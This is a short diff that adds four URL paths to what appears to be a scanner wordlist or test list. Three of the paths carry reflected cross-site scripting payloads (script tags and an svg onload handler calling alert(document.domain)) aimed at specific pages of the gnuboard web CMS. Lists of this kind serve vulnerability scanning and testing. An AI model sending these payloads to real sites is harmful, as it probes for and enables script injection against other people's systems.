@@ -1,0 +1,4 @@
+/LICENSE.txt
+/mobile/shop/lg/mispwapurl.php?LGD_OID=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>
+/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
